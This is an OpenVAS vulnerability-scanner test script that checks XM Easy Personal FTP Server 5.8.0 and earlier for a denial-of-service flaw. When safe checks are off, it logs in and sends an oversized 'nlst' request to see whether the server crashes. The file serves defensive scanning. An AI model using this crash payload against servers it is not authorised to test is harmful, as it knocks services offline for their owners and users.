###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_xm_easy_personal_ftp_dos_vuln.nasl 13610 2019-02-12 15:17:00Z cfischer $
#
# XM Easy Personal FTP Server 'LIST' And 'NLST' Command DoS Vulnerability
#
# Authors:
# Sharath S <sharaths@secpod.com>
#
# Updated to CVE-2009-4048
#  - By Maneesh KB <kmaneesh@secpod.com> on 2009-11-24 #5879
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801120");
  script_version("$Revision: 13610 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-12 16:17:00 +0100 (Tue, 12 Feb 2019) $");
  script_tag(name:"creation_date", value:"2009-10-22 15:34:45 +0200 (Thu, 22 Oct 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-3643", "CVE-2009-4048");
  script_bugtraq_id(37016, 36969);
  script_name("XM Easy Personal FTP Server 'LIST' And 'NLST' Command DoS Vulnerability");
  script_xref(name:"URL", value:"http://secunia.com/advisories/36941/");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/54277");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/53643");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/0910-exploits/XM-ftp-dos.txt");

  script_tag(name:"qod_type", value:"remote_banner");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("FTP");
  script_dependencies("gb_xm_easy_personal_ftp_detect.nasl");
  script_mandatory_keys("XM-Easy-Personal-FTP/Ver");
  script_require_ports("Services/ftp", 21);

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause a Denial of
  Service in the affected application.");

  script_tag(name:"affected", value:"Dxmsoft, XM Easy Personal FTP Server version 5.8.0 and prior.");

  script_tag(name:"insight", value:"The flaws are due to,

  - An error when processing directory listing FTP requests. This can be
  exploited to terminate the FTP service via overly large 'LIST' or 'NLST' requests.

  - An error when handling certain FTP requests. By sending a specially-
  crafted request to the APPE or DELE commands, a remote authenticated
  attacker could cause the server to stop responding.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"This host is running XM Easy Personal FTP Server and is prone to
  Denial of Service vulnerability.");

  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}


include("ftp_func.inc");
include("version_func.inc");

xmPort = get_ftp_port(default:21);

xmVer = get_kb_item("XM-Easy-Personal-FTP/Ver");
if(isnull(xmVer)){
  exit(0);
}

if(!safe_checks())
{
  soc1 = open_sock_tcp(xmPort);
  if(soc1)
  {
    kb_creds = ftp_get_kb_creds();
    user = kb_creds["login"];
    pass = kb_creds["pass"];

    ftplogin = ftp_log_in(socket:soc1, user:user, pass:pass);
    if(ftplogin)
    {
      send(socket:soc1, data:string("nlst ", crap(length: 6300, data:"./A")));
      close(soc1);

      soc2 = open_sock_tcp(xmPort);
      resp = ftp_recv_line(socket:soc2);
      if(!resp)
      {
        security_message(xmPort);
        exit(0);
      }
      close(soc2);
    }
  }
}

if(version_is_less_equal(version:xmVer, test_version:"5.8.0")){
  security_message(xmPort);
}
